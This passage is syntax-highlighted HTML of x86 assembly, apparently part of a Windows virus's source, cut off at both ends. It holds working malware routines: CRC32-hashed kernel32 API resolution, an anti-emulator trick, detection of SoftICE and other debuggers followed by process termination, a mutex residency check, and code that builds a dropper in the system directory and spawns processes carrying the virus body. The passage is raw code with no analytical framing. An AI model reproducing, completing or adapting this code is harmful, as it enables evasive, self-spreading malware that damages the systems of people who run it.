    </span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;calculate next crc32 func.</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;crc32 algorithm</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@4_crc32_nByte</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc5">@@4_crc32_nBit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">@@4_crc32_no</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08320h</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0edb8h</span><span class="sc0">
    </span><span class="sc5">@@4_crc32_no</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@4_crc32_nBit</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@4_crc32_nByte</span><span class="sc0">
    </span><span class="sc5">@@4_crc32_fin</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32_crcs</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;crc32 == my func ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@5</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@4</span><span class="sc0">
    </span><span class="sc5">gk32a_f_a</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gk32a_f</span><span class="sc0">
    </span><span class="sc5">@@3_a</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@3</span><span class="sc0">
    </span><span class="sc5">@@5</span><span class="sc4">:</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get addr of the new func.</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc5">k32_addrs</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">           </span><span class="sc1">;store its</span><span class="sc0">
   </span><span class="sc5">@@5a</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@5b</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">14</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@5a</span><span class="sc0">
   </span><span class="sc5">@@5b</span><span class="sc4">:</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">count</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@3_a</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_number</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;update Sleep function</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@6</span><span class="sc4">:</span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">process_maps</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">@@7</span><span class="sc4">:</span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@6</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
    </span><span class="sc5">gk32a_f</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">;anti-emulator</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@anti_e</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">
</span><span class="sc5">get_k32_apis</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">kill_st</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@sNT</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc5">@s95</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\\.\SICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;name drivers</span><span class="sc0">
   </span><span class="sc5">@sNT</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\\.\NTICE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">           </span><span class="sc1">;open SoftICE 95/98 or</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@ks_nt</span><span class="sc0">              </span><span class="sc1">;     SoftICE NT/2k driver</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpCloseHandle</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@ks_kill</span><span class="sc0">            </span><span class="sc1">;kill process</span><span class="sc0">
   </span><span class="sc5">@ks_nt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">@s95</span><span class="sc4">-</span><span class="sc5">@sNT</span><span class="sc0">           </span><span class="sc1">;open the second driver</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@ks_dos</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">lpCloseHandle</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">@ks_kill</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpExitProcess</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">@ks_dos</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">32</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;TD32 etc.</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@ks_kill</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">open_always_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;create file always</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;useful for droppers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc5">open_file</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;open file in ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">cdq</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
    </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpCreateFile</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">kill_st</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">check_resident</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;create mutex or get if it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;has been created =&gt; in mem</span><span class="sc0">
   </span><span class="sc5">lpCreateMutexA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">lpGetLastError</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@cr_f</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpReleaseMutex</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@cr_f</span><span class="sc4">:</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__return</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">check_resident</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">create_process_maps</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">error</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_dropper</span><span class="sc0">           </span><span class="sc1">;create dropper in sys dir</span><span class="sc0">
    </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">cpm_fnodeal</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpGetCurrentProcessId</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">if_parent</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
   </span><span class="sc5">cpm_shared_mem</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpSetErrorMode</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">vbody</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc5">cpm_nxproc</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;hProc, hThr, ProcID, ThrID</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc2">68</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">@@1a</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1a</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">640</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">cpm_cmdline</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">lpCreateProcessA</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">cpm_failed</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get hProcess and ProcessID</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">process_maps</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">vstart</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
